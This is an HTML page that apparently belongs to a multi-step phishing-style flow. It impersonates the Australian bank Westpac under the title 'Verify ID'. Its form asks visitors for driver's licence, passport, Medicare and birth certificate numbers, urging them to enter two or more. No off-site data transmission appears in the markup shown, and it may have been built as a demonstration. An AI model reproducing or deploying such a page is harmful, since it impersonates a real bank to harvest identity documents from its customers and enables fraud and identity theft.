<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <link rel="stylesheet" href="styles.css" type="text/css" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Westpac - Verify ID</title>
  </head>

  <body class="red">
    <!-- Header -->
    <header class="header">
      <img src="images/logo.png" class="desktop_logo" alt="logo" />
      <img src="images/mobile_logo.png" class="mobile_logo" alt="logo" />
      <!-- Dummy login button link -->
      <button class="button">Login</button>
    </header>

    <!-- Navigation bar -->
    <nav>
      <div class="nav">
        <a href="index.html">Home</a>
        <a class="active" href="index.html">Bank Accounts</a>
        <a href="#">Loans</a>
        <a href="#">Contact Us</a>
      </div>
    </nav>

    <!-- Main content -->
    <main class="purple-content">
      <!-- Question -->
      <div class="container4">
        <h2 class="text4">Verify your ID</h2>
        <h3 class="text4">
          Please enter 2 or more for greater chance of verification.
        </h3>
      </div>

      <!-- Form -->
      <form action="q4-address.html">
        <div class="form-group">
          <input
            type="number"
            id="licence"
            name="licence"
            placeholder="Driver's Licence"
          />
          <div class="messages"></div>
        </div>

        <div class="form-group">
          <input
            type="text"
            id="passport"
            name="passport"
            placeholder="Passport Number"
          />
          <div class="messages"></div>
        </div>

        <div class="form-group">
          <input
            type="number"
            id="medicare"
            name="medicare"
            placeholder="Medicare card number"
          />
          <div class="messages"></div>
        </div>

        <div class="form-group">
          <input
            type="number"
            id="birthcert"
            name="birthcert"
            placeholder="Birth Certificate number"
          />
          <div class="messages"></div>
        </div>
     
      <!-- Back and Next Buttons -->
      <div class="buttons-box">
        <a href="q2-name.html" id="back" class="clear-button">Back</a>
        <button type="submit" id="next" class="purple-button">Next</a>
      </div>
    </form>
    </main>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/validate.js/0.13.1/validate.min.js"></script>
    <script src="script.js"></script>
  </body>
</html>
